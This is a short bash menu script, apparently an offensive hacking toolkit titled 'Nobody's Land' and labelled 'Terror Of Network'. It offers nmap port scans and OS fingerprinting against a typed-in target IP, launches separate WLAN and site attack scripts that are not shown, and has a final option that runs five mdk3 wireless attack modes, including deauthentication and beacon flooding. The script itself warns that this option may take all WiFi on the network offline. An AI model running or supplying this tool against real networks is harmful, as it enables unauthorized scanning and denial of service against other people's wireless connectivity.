cyan='\e[0;36m' 
green='\033[92m' 
red='\e[1;31m' 
yel='\e[0;33m' 
orange='\e[38;5;166m'
echo -e $red"Terror Of Network"
figlet "NOBODY'S"
figlet "LAND" 

echo -e $red"By 0Day-At0miK"

#Attacks
echo -e $green"========================"
echo -e $yel"1)Scan Target 2)OS Fingerprint"
echo -e $green"========================"
echo -e $yel"3)WLAN Attacks Menú 4)Site Attacks Menú"
echo -e $green"========================"
echo -e $yel"5)N0B0DY'S L4ND ATTACK"
echo -e $green"========================"
echo -e $red"Happy Hacking! "

read -p " [<NL>] " attacks 

if [ $attacks = "1" ] 
then
clear 
figlet "Scan"
read -p " [>TARGET-IP<] " target1 
nmap $target1  
fi

if [ $attacks = "2" ]
then
clear 
figlet "OS"
figlet "Fingerprint"
read -p " [>TARGET-IP<] " target2 
nmap -A $target2
fi

if [ $attacks = "3" ]
then
clear
cd $HOME/NobodysLand/
bash WA.sh
fi

if [ $attacks = "4" ]
then
clear
cd $HOME/NobodysLand/
bash SA.sh 
fi

if [ $attacks = "5" ]
then 
clear
figlet "Nobody'S"
figlet "Land"
figlet "Attack" 
fi
if [ $attacks = "5" ]
then
echo -e $cyan"Are You Sure To Start This Powerful Attacks. This Attack May Take Offline All WiFi On Your Network [y/N]"
read -p " [>Choose<] " choose
if [ $choose = "y" ] 
then
read -p " [>Interface<] " inter
echo -e $red"[+] Starting..."

xterm -hold -e mdk3 $inter a

xterm -hold -e mdk3 $inter b

xterm -hold -e mdk3 $inter d

xterm -hold -e mdk3 $inter m

xterm -hold -e mdk3 $inter w 

fi
fi
